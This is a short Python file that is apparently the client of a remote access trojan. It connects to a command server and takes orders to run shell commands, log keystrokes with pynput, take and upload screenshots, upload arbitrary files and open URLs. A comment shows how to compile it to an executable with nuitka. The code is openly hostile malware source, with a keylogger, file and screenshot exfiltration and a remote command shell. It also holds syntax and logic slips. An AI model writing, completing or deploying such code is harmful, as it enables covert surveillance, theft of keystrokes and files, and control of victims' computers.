import os
import random
import socket
import string
import subprocess
import webbrowser


from pynput import keyboard
import pyautogui
import os


class Clients:
    def __init__(self,host,port):
        self.host = host
        self.port = port

    def ConnectToServer(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.host,self.port))
        def on_press(key):
            strkey = str(key)
            s.send(bytes('k: ' + strkey,encoding='utf-8'))
        def upload_file(file):
            f = open(file,'rb')
            s.send(f.read())
        def open_url(url):
            webbrowser.open(url)
        while True:
            RecvMessage = s.recv(2048).decode('utf-8')
            print(RecvMessage)
            if RecvMessage == True:
                s.send(bytes(' ',encoding='utf-8'))
            if RecvMessage[:7] == '!Shell ':
                Command = RecvMessage[6:]
                output = subprocess.run(Command, shell=True, stdout=subprocess.PIPE, universal_newlines=True)
                outputstr = str(output.stdout)
                s.send(bytes(outputstr, encoding='utf-8'))

            elif RecvMessage == '!Keylogger':
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join()
          

            elif RecvMessage[:4] == '!cd ':
                os.chdir((RecvMessage[4:])
            elif RecvMessage == '!Screenshot':
                screenshot = pyautogui.screenshot('Screenshot.png')
                upload_file(file='Screenshot.png')
            elif RecvMessage[:8] == '!upload ':
                filey = RecvMessage[8:]
                upload_file(file=filey)
            elif RecvMessage[:6] == '!Open ':
                URL = RecvMessage[6:]
                open_url(url=URL)
            elif RecvMessage == '!Rickroll':
                open_url(url='https://www.youtube.com/watch?v=dQw4w9WgXcQ')



cli = Clients(host='localhost',port=58699)
cli.ConnectToServer()#py -m nuitka --lto=no main.py


